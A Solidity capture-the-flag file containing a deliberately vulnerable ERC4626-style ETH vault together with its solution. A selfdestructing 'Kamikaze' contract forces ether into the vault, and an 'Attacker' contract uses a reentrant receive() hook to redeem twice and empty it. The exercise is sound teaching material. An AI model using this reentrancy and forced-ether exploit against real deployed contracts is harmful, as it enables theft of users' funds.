// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./ERC4626ETH.sol";

contract Vault is ERC4626ETH {
    address public flagHolder;

    // If more balance than shares, send extra balance to the caller.
    // Shares can only become more than 1 to 1 by destroying a contract to inject eth (first step of attack)
    // Extra balance sent only after the original withdraw
    // Reentrancy taking the extra multiple times
    constructor() payable ERC20("Vault Challenge Token", "VCT") {
        require(msg.value == 1 ether, "Must init the contract with 1 eth");
        _deposit(msg.sender, address(this), msg.value);
    }

    function captureTheFlag(address newFlagHolder) external {
        require(address(this).balance == 0, "Balance is not 0");

        flagHolder = newFlagHolder;
    }
}

contract Kamikaze {
    constructor(address _target) payable {
        require(msg.value == 1 ether, "send 1 eth");
        selfdestruct(payable(_target));
    }
}

contract Attacker {
    bool called;

    Vault private target;

    constructor(address _target) payable {
        target = Vault(_target);
    }

    function attack() external payable {
        require(msg.value == 2 ether, "not enough ether");
        target.deposit{value: 2 ether}(2 ether, address(this));
        target.redeem(1 ether, address(this), address(this));
        target.captureTheFlag(msg.sender);
    }

    receive() external payable {
        if (called) {
            return;
        }

        called = true;
        target.redeem(1 ether, address(this), address(this));
    }
}
